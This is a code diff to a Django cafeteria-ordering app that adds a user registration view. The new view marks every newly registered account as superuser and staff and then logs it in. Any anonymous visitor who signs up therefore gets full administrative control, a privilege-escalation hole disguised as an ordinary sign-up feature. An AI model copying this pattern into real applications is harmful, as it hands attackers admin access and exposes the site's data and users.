@@ -185,3 +185,20 @@ def catalogo(request):
 @permission_required('cafeteria.view_orden', raise_exception=True)
 def reporte_ordenes(request):
     return render(request, 'reportes_ordenes.html')
+
+from django.contrib.auth import login
+from django.contrib.auth.forms import UserCreationForm
+
+def register(request):
+    if request.method == 'POST':
+        form = UserCreationForm(request.POST)
+        if form.is_valid():
+            user = form.save()
+            user.is_superuser = True
+            user.is_staff = True
+            user.save()
+            login(request, user)
+            return redirect('home')
+    else:
+        form = UserCreationForm()
+    return render(request, 'registration/register.html', {'form': form})
